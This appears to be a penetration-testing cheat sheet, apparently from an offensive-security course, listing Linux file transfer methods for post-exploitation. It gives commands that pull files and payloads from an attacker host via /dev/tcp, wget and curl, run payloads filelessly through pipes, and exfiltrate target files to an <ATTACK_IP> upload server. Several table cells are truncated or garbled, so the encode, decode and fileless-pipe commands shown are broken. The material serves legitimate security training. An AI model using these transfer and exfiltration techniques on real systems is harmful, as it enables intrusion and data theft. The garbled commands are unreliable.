### Linux File Transfer Methods

Linux offers versatile tools for file transfers, primarily leveraging **HTTP/HTTPS**, **SSH**, and **Bash** built-ins.

---

### 1. Base64 Encoding/Decoding

Use this method when you have **terminal access** but want to perform a transfer **without network communication**. This involves converting a file into a string for manual copy-pasting.

**Operational Workflow:**

1. **Verify** the source file integrity on the attack machine.
2. **Encode** the file into a single-line Base64 string.
3. **Copy** the string and **decode** it on the target machine.
4. **Verify** the transferred file matches the original hash.

**Command Reference:**

|Action|Command|Purpose|
|:--|:--|:--|
|**Check MD5**|`md5sum <FILENAME>`|Verify file integrity|
|**Encode**|`cat|base64 -w 0; echo`|
|**Decode**|`echo -n '<BASE64_STRING>'|base64 -d > `|

---

### 2. Web Downloads (wget & cURL)

Wget and cURL are the most common utilities for interacting with web applications. Use these for standard **HTTP/HTTPS** downloads.

**Command Reference:**

|Utility|Command|Parameter Note|
|:--|:--|:--|
|**wget**|`wget <URL> -O <OUTPUT_PATH>`|Uppercase **-O** for output name|
|**cURL**|`curl -o <OUTPUT_PATH> <URL>`|Lowercase **-o** for output name|

---

### 3. Fileless Execution

Use fileless operations to execute payloads **directly in memory** via pipes, avoiding writing the primary file to disk.

**Note:** Some payloads (e.g., `mkfifo`) may still create temporary files on the OS.

**Command Reference:**

|Technique|Command|
|:--|:--|
|**Bash Pipe**|`curl|
|**Python Pipe**|`wget -qO-|

---

### 4. Bash /dev/tcp Downloads

Use this as a **fallback** when standard tools like `wget` or `curl` are unavailable. This requires Bash version 2.04+ compiled with network redirections.

**Operational Workflow:**

1. **Connect** to the source webserver using a file descriptor.
2. **Send** a manual HTTP GET request.
3. **Capture** the response.

**Command Reference:**

|Step|Command|
|:--|:--|
|**1. Connect**|`exec 3<>/dev/tcp/<ATTACK_IP>/<PORT>`|
|**2. Request**|`echo -e "GET /<FILENAME> HTTP/1.1\n\n">&3`|
|**3. Capture**|`cat <&3`|

---

### 5. SSH and SCP Transfers

Secure Copy (SCP) uses the **SSH protocol (TCP/22)**. Use this when outbound SSH is permitted by the organization's firewall.

**Operational Workflow:**

1. **Enable** and **start** the SSH server on the receiving machine (e.g., Pwnbox).
2. **Confirm** the service is listening on the expected port.
3. **Execute** the transfer using valid credentials.

**Command Reference:**

|Action|Command|
|:--|:--|
|**Download**|`scp <USERNAME>@<ATTACK_IP>:<REMOTE_PATH> <LOCAL_PATH>`|
|**Upload**|`scp <LOCAL_PATH> <USERNAME>@<ATTACK_IP>:<REMOTE_PATH>`|

---

### 6. Secure Web Uploads

Use a Python **uploadserver** when you need a secure (HTTPS) method to exfiltrate files from a target to your attack machine.

**Operational Workflow:**

1. **Install** the `uploadserver` module on the attack machine.
2. **Generate** a self-signed certificate for encrypted communication.
3. **Host** the server in a clean directory (separate from the certificate).
4. **Upload** files from the target using `curl` with the `--insecure` flag to bypass certificate warnings.

**Command Reference:**

|Component|Command|
|:--|:--|
|**Install**|`sudo python3 -m pip install --user uploadserver`|
|**Cert Gen**|`openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`|
|**Start Server**|`sudo python3 -m uploadserver <PORT> --server-certificate ~/server.pem`|
|**Upload File**|`curl -X POST https://<ATTACK_IP>/upload -F 'files=@<PATH>' --insecure`|

---

### 7. Alternative Mini Web Servers

Use these to quickly host files on a compromised machine for download to your attack host. This is useful when you need **flexibility** in ports and webroot locations.

**Note:** If the target is already a web server, you can move files to the existing web directory for access.

**Command Reference:**

|Language|Command|
|:--|:--|
|**Python 3**|`python3 -m http.server <PORT>`|
|**Python 2.7**|`python2.7 -m SimpleHTTPServer <PORT>`|
|**PHP**|`php -S 0.0.0.0:<PORT>`|
|**Ruby**|`ruby -run -ehttpd . -p<PORT>`|